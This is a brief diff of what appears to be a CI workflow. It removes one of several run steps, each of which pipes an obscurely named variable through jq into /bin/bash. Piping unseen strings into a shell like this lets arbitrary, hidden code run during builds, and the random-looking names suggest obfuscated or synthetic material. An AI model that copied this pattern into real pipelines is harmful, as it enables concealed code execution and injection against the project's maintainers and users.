@@ -37,7 +37,6 @@ jobs:
           printf '%s' "$mdfyq5814" | jq -r .alzx0229 | /bin/bash
           echo $xv2215 | jq -r .wqcr4 | /bin/bash
           printf '%s' "$lx19" | jq -r .uqy151 | /bin/bash
-          printf '%s' "$dtzsp692" | jq -r .kvdhb5 | /bin/bash
           echo $lvy306 | jq -r .seqv675 | /bin/bash
 
       - name: Upload results
